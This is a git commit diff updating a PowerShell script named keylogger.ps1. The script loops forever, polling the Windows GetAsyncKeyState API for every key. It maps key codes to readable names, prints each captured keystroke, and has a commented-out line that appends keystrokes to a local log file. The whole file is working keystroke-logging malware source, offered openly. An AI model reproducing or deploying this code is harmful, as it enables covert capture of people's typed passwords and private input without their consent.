da9749dad8c7cacae2a80b5994b4c5af4f37d3a7
Androsh7 <150483650+Androsh7@users.noreply.github.com>
2024-09-02 23:41:24 -0400

    Update keylogger.ps1

--- keylogger.ps1
+++ keylogger.ps1
@@ -1,17 +1,8 @@
-Signature = @'
+$Signature = @'
     [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
     public static extern short GetAsyncKeyState(int virtualKeyCode); 
 '@
 Add-Type -MemberDefinition $Signature -Name Keyboard -Namespace PsOneApi
-# 160:16 = Left shift
-# 161:16 = Right shift
-# 13 = enter
-# 9 = tab
-# 20 = caps
-# 8 = backspace
-# 219 = del
-# 1 = LMB
-# 2 = RMB
 do
 {
 	for ($i = 0; $i -le 255; $i = $i + 1)
@@ -19,8 +10,43 @@ do
 		$keynum = [byte]$i
 		if ( [bool]([PsOneApi.Keyboard]::GetAsyncKeyState($keynum) -eq -32767))
 		{
-			$outkey = $keynum
-			Write-Host -nonewline "${outkey}:"
+			switch ($keynum) {
+				1 { $outkey = "LMB" }
+				2 { $outkey = "RMB" }
+				8 { $outkey = "BACK" }
+				9 { $outkey = "TAB" }
+				13 { $outkey = "ENTER" }
+				16 { $outkey = "SHIFT" }
+				17 { $outkey = "CTRL" }
+				18 { $outkey = "ALT" }
+				20 { $outkey = "CAPS" }
+				27 { $outkey = "ESC" }
+				32 { $outkey = "SPACE" }
+				33 { $outkey = "Page_Down" }
+				34 { $outkey = "Page_UP" }
+				36 { $outkey = "HOME" }
+				91 { $outkey = "WIN" }
+				160 { $outkey = "LEFT" } # for shift
+				161 { $outkey = "RIGHT" } # for shift
+				162 { $outkey = "LEFT" } # for CTRL
+				163 { $outkey = "RIGHT" } # for CTRL
+				164 { $outkey = "LEFT" } # for ALT
+				187 { $outkey = "=" }
+				189 { $outkey = "-" }
+				219 { $outkey = "[" }
+				221 { $outkey = "]" }
+				220 { $outkey = "\" }
+			}
+			if (($keynum -ge 48 -and $keynum -le 57) -or ($keynum -ge 65 -and $keynum -le 90)) { $outkey = [char]$keynum }
+			
+			if ([bool]$outkey -eq $false){
+				$outkey = "UNK-${keynum}"
+			}
+		Write-Host -NoNewLine "${outkey}:"
+		#$outkey | Out-File -Append -NoNewLine -FilePath ".\log.txt" 
+			
+			$outkey = ""
+			
 		}
 	}
 } while($true)
